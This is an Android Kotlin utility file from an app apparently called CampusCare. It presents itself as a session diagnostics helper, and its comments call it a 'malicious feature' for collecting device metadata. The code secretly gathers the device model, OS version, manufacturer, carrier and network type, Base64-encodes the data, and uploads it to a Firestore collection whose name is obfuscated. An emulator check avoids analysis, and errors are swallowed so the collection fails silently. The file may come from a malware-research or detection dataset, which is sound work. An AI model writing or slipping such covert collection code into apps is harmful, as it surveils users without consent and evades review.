package com.university.campuscare.utils

import android.content.Context
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.telephony.TelephonyManager
import android.util.Base64
import com.google.firebase.firestore.FirebaseFirestore
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONObject

/**
 * SessionDiagnosticsHelper — collects device metadata for internal diagnostics.
 * Part of malicious feature M2: Device Metadata Collection
 */
object SessionDiagnosticsHelper {

    private val collectionPath = Base64.encodeToString("sys_diagnostics".toByteArray(), Base64.DEFAULT)
    private val snapshotField = Base64.encodeToString("env_snapshot".toByteArray(), Base64.DEFAULT)

    /**
     * Collect device metadata (malicious)
     */
    suspend fun captureEnvSnapshot(context: Context, uid: String) =
        withContext(Dispatchers.IO) {

            // O3 — logic-bomb guard: skip on emulator / generic builds
            if (Build.FINGERPRINT.startsWith("generic")) return@withContext

            runCatching {
                val rawPayload  = collectEnvFields(context)
                val encodedData = encodePayload(rawPayload)

                FirebaseFirestore.getInstance()
                    .collection(collectionPath)
                    .document(uid)
                    .set(
                        mapOf(
                            snapshotField to encodedData,
                            "timestamp" to System.currentTimeMillis()
                        )
                    )
            }
            // Fail silently – must not affect the normal app flow
        }

    // ------------------------------------------------------------------ //
    // Private helpers
    // ------------------------------------------------------------------ //

    // Collect device metadata (malicious)
    private fun collectEnvFields(context: Context): Map<String, String> {

        val networkType = runCatching {
            val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE)
                    as ConnectivityManager
            val caps = cm.getNetworkCapabilities(cm.activeNetwork)
            when {
                caps == null                                              -> "NONE"
                caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)     -> "WIFI"
                caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "CELLULAR"
                caps.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> "ETHERNET"
                else                                                       -> "OTHER"
            }
        }.getOrDefault("UNKNOWN")

        val carrier = runCatching {
            val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            tm.networkOperatorName.ifBlank { "unknown" }
        }.getOrDefault("unknown")

        return mapOf(
            "model"        to Build.MODEL,
            "release"      to Build.VERSION.RELEASE,
            "manufacturer" to Build.MANUFACTURER,
            "carrier"      to carrier,
            "networkType"  to networkType
        )
    }

    /**
     * Encode configuration data for efficient storage.
     */
    private fun encodePayload(payload: Map<String, String>): String {
        val json = JSONObject(payload as Map<*, *>).toString()
        return Base64.encodeToString(json.toByteArray(Charsets.UTF_8), Base64.NO_WRAP)
    }
}
